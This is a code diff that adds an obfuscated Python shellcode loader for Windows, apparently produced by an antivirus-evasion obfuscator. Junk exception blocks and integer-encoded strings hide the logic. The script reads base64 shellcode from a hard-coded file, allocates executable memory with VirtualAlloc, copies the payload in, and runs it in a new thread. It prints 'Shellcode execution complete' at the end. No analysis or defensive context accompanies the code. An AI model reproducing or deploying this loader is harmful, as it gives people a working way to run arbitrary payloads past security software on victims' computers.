@@ -1,0 +1,329 @@
+
+
+globals()['R_E_D__A_V_______'] = (bool) if bool(bool(bool(bool))) < bool(type(int(75)>int(1813)<int(116)>int(311))) and bool(str(str(19)>int(112)<int(38)>int(218))) > 2 else bool
+globals()['R_E_D__A_V______'] =  (str) if bool(bool(bool(str))) < bool(type(int(1912)>int(124)<int(96)>int(1314))) and bool(str(str(86)>int(1113)<int(64)>int(78))) > 2 else str
+globals()['R_E_D__A_V________'] =  (type) if bool(bool(bool(type))) < bool(type(int(1014)>int(131)<int(117)>int(413))) and bool(str(str(151)>int(1510)<int(1918)>int(1917))) > 2 else type
+globals()['R_E_D__A_V_____'] =  (int) if bool(bool(bool(int))) < bool(type(int(1112)>int(113)<int(141)>int(719))) and bool(str(str(144)>int(519)<int(48)>int(191))) > 2 else int
+globals()['R_E_D__A_V_________'] =  (bytes) if bool(bool(bool(bytes))) < bool(type(int(315)>int(146)<int(1715)>int(73))) and bool(str(str(710)>int(179)<int(1511)>int(181))) > 2 else bytes
+globals()['R_E_D__A_V__________'] =  (vars) if bool(bool(bool(vars))) < bool(type(int(128)>int(199)<int(158)>int(1013))) and bool(str(str(216)>int(27)<int(610)>int(151))) > 2 else vars
+globals()['R_E_D__A_V____________'] =  (callable) if bool(bool(bool(callable))) < bool(type(int(172)>int(98)<int(510)>int(913))) and bool(str(str(1710)>int(1412)<int(1016)>int(1017))) > 2 else callable
+globals()['R_E_D__A_V_____________'] =  (eval) if bool(bool(bool(eval))) < bool(type(int(96)>int(188)<int(319)>int(169))) and bool(str(str(217)>int(410)<int(34)>int(315))) > 2 else eval
+globals()['______________R_E_D__A_V______________'] =  (list) if bool(bool(bool(list))) < bool(type(int(811)>int(1415)<int(116)>int(912))) and bool(str(str(219)>int(1012)<int(1915)>int(1318))) > 2 else list
+globals()['R_E_D__A_V______________'] =  (map) if bool(bool(bool(map))) < bool(type(int(121)>int(1617)<int(21)>int(129))) and bool(str(str(1514)>int(610)<int(79)>int(713))) > 2 else map
+
+globals()['R_E_D__A_V___'] =  (__import__) if bool(bool(bool(__import__))) < bool(type(int(613)>int(513)<int(719)>int(1812))) and bool(str(str(1610)>int(153)<int(1514)>int(182))) > 2 else __import__
+
+globals()['tryᅠ'] =  (print) if bool(bool(bool(print))) < bool(type(int(1419)>int(101)<int(1816)>int(1615))) and bool(str(str(37)>int(148)<int(182)>int(1319))) > 2 else print
+globals()['exceptᅠ'] =  (input) if bool(bool(bool(input))) < bool(type(int(915)>int(518)<int(517)>int(118))) and bool(str(str(122)>int(112)<int(57)>int(217))) > 2 else input
+def R_E_D__A_V____(RED_DEFENDER,*k):
+    if k:
+        R_E_D____A_V = '+'
+        op = "+"
+    else:
+        R_E_D____A_V = ''
+        op = ''
+    globals()['_918'] = (lambda: (lambda _121: _121 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()
+    globals()['R_E_D__A_V____'] = R_E_D__A_V____
+    globals()['R_E_D__A_V______'] = R_E_D__A_V______
+    globals()['RED_DEFENDER'] = RED_DEFENDER
+    for globals()['R_E_D____A_V_'] in globals()['RED_DEFENDER']:
+        if not _918:globals()['R_E_D____A_V_'] += (lambda : '')()
+        R_E_D____A_V += R_E_D__A_V______(R_E_D____A_V_);f = (lambda: (lambda _1417: _1417 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()
+    return R_E_D____A_V
+def ______R_E_D__A_V_______(x):
+    return R_E_D__A_V_____(x-0x7777)
+def R_E_D__A_V(e):
+    br = bytearray(e[len(b"R_E_D__A_V__"):])
+    r = 0
+    for b in br:
+        r = r * 256 + b
+    return r
+def ____________________________(x):
+    ar = []
+    for i in x:
+        ar.append(R_E_D__A_V_____________(i))
+    return ar
+if (lambda: (lambda _714: _714 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)():
+    def R_E_D__A_V_______________(R_E_D__A_V____________):
+        R_E_D__A_V____________ = R_E_D__A_V____________-0xFF78FF
+        if R_E_D__A_V____________ <= 0x7F:
+                    return R_E_D__A_V______(R_E_D__A_V_________([R_E_D__A_V____________]),"utf8")
+        elif R_E_D__A_V____________ <= 0x7FF:
+                    if 1<2:
+                            b1 = 0xC0 | (R_E_D__A_V____________ >> 6)
+                    b2 = 0x80 | (R_E_D__A_V____________ & 0x3F)
+                    return R_E_D__A_V______(R_E_D__A_V_________([b1, b2]),"utf8")
+        elif R_E_D__A_V____________ <= 0xFFFF:
+                b1 = 0xE0 | (R_E_D__A_V____________ >> 12)
+                if 2>1:
+                    b2 = 0x80 | ((R_E_D__A_V____________ >> 6) & 0x3F)
+                b3 = 0x80 | (R_E_D__A_V____________ & 0x3F)
+                return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3]),"utf8")
+        else:
+            b1 = 0xF0 | (R_E_D__A_V____________ >> 18)
+            if 2==2:
+                b2 = 0x80 | ((R_E_D__A_V____________ >> 12) & 0x3F)
+            if 1<2<3:
+                b3 = 0x80 | ((R_E_D__A_V____________ >> 6) & 0x3F)
+            b4 = 0x80 | (R_E_D__A_V____________ & 0x3F)
+            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3, b4]),"utf8")
+    def _hex(j):
+        R_E_D__A_V____________ = ''
+        for _hex in j:
+            R_E_D__A_V____________ += (R_E_D__A_V_______________(_hex))
+        return R_E_D__A_V____________
+else:"R_E_D____A_V"
+try:
+    match '1613' == '1517':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _81 = [[True], [False]]
+            R_E_D__A_V______(['_197'])
+    raise MemoryError([True])
+except MemoryError as _611:
+    import sys
+try:
+    match '113' == '119':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _23 = [[True], [False]]
+            R_E_D__A_V______(['_29'])
+    raise MemoryError([True])
+except MemoryError as _97:
+    import ctypes
+try:
+    match '128' == '510':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _1213 = [[True], [False]]
+            R_E_D__A_V______(['_215'])
+    raise MemoryError([True])
+except MemoryError as _616:
+    import base64
+try:
+    match '138' == '1418':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _1715 = [[True], [False]]
+            R_E_D__A_V______(['_153'])
+    raise MemoryError([True])
+except MemoryError as _1712:
+    import ctypes.wintypes as wt
+try:
+    match '85' == '135':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _912 = [[True], [False]]
+            R_E_D__A_V______(['_37'])
+    raise MemoryError([True])
+except MemoryError as _162:
+    kernel32 = ctypes.windll.kernel32
+try:
+    match '1618' == '78':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _137 = [[True], [False]]
+            R_E_D__A_V______(['_1412'])
+    raise MemoryError([True])
+except MemoryError as _78:
+    kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
+try:
+    match '214' == '64':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _1916 = [[True], [False]]
+            R_E_D__A_V______(['_49'])
+    raise MemoryError([True])
+except MemoryError as _133:
+    kernel32.VirtualAlloc.restype = wt.LPVOID
+try:
+    match '113' == '131':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _1917 = [[True], [False]]
+            R_E_D__A_V______(['_198'])
+    raise MemoryError([True])
+except MemoryError as _1917:
+    kernel32.CreateThread.argtypes = (wt.HANDLE, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPDWORD)
+try:
+    match '36' == '89':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _1516 = [[True], [False]]
+            R_E_D__A_V______(['_121'])
+    raise MemoryError([True])
+except MemoryError as _610:
+    kernel32.CreateThread.restype = wt.HANDLE
+try:
+    match '1415' == '1716':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _149 = [[True], [False]]
+            R_E_D__A_V______(['_114'])
+    raise MemoryError([True])
+except MemoryError as _1112:
+    kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
+try:
+    match '1013' == '81':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _48 = [[True], [False]]
+            R_E_D__A_V______(['_148'])
+    raise MemoryError([True])
+except MemoryError as _1418:
+    kernel32.RtlMoveMemory.restype = None
+try:
+    match '188' == '1215':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _614 = [[True], [False]]
+            R_E_D__A_V______(['_183'])
+    raise MemoryError([True])
+except MemoryError as _124:
+    kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
+try:
+    match '106' == '1317':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _1011 = [[True], [False]]
+            R_E_D__A_V______(['_712'])
+    raise MemoryError([True])
+except MemoryError as _97:
+    kernel32.WaitForSingleObject.restype = wt.DWORD
+try:
+    match '112' == '166':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _1317 = [[True], [False]]
+            R_E_D__A_V______(['_1119'])
+    raise MemoryError([True])
+except MemoryError as _1014:
+    b64_file = (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742722, 16742713, 16742747, 16742740, 16742770, 16742756, 16742769, 16742770, 16742747, 16742771, 16742769, 16742752, 16742765, 16742771, 16742747, 16742723, 16742756, 16742770, 16742762, 16742771, 16742766, 16742767, 16742747, 16742721, 16742720, 16742739, 16742687, 16742740, 16742735, 16742723, 16742720, 16742739, 16742724, 16742747, 16742770, 16742759, 16742756, 16742763, 16742763, 16742754, 16742766, 16742755, 16742756, 16742747, 16742759, 16742756, 16742763, 16742763, 16742766, 16742750, 16742757, 16742774, 16742750, 16742770, 16742759, 16742756, 16742763, 16742763, 16742754, 16742766, 16742755, 16742756, 16742701, 16742753, 16742709, 16742707]))))())())()
+try:
+    match '1612' == '914':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _145 = [[True], [False]]
+            R_E_D__A_V______(['_132'])
+    raise MemoryError([True])
+except MemoryError as _1812:
+    tryᅠ('{}{}'.format('Loading shellcode from: ', b64_file))
+try:
+    match '63' == '619':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _318 = [[True], [False]]
+            R_E_D__A_V______(['_711'])
+    raise MemoryError([True])
+except MemoryError as _118:
+    with open(b64_file, (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742769]))))())())()) as f:
+        b64_content = f.read().strip()
+try:
+    match '515' == '105':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _1816 = [[True], [False]]
+            R_E_D__A_V______(['_166'])
+    raise MemoryError([True])
+except MemoryError as _1419:
+    buf = base64.b64decode(b64_content)
+try:
+    match '116' == '125':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _75 = [[True], [False]]
+            R_E_D__A_V______(['_1218'])
+    raise MemoryError([True])
+except MemoryError as _1115:
+    tryᅠ('{}{}{}'.format('Shellcode size: ', len(buf), ' bytes'))
+try:
+    match '24' == '164':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _1112 = [[True], [False]]
+            R_E_D__A_V______(['_113'])
+    raise MemoryError([True])
+except MemoryError as _1317:
+    memAddr = kernel32.VirtualAlloc(None, len(buf), (lambda: R_E_D__A_V(b'R_E_D__A_V__0\x00'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__@'))())
+try:
+    match '43' == '111':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _165 = [[True], [False]]
+            R_E_D__A_V______(['_122'])
+    raise MemoryError([True])
+except MemoryError as _191:
+    kernel32.RtlMoveMemory(memAddr, buf, len(buf))
+try:
+    match '314' == '1119':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _1118 = [[True], [False]]
+            R_E_D__A_V______(['_1317'])
+    raise MemoryError([True])
+except MemoryError as _125:
+    th = kernel32.CreateThread(None, (lambda: R_E_D__A_V(b'R_E_D__A_V__'))(), memAddr, None, (lambda: R_E_D__A_V(b'R_E_D__A_V__'))(), None)
+try:
+    match '155' == '38':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _1910 = [[True], [False]]
+            R_E_D__A_V______(['_172'])
+    raise MemoryError([True])
+except MemoryError as _519:
+    kernel32.WaitForSingleObject(th, -(lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))())
+try:
+    match '85' == '1112':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _1118 = [[True], [False]]
+            R_E_D__A_V______(['_39'])
+    raise MemoryError([True])
+except MemoryError as _1719:
+    tryᅠ((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742738, 16742759, 16742756, 16742763, 16742763, 16742754, 16742766, 16742755, 16742756, 16742687, 16742756, 16742775, 16742756, 16742754, 16742772, 16742771, 16742760, 16742766, 16742765, 16742687, 16742754, 16742766, 16742764, 16742767, 16742763, 16742756, 16742771, 16742756]))))())())())
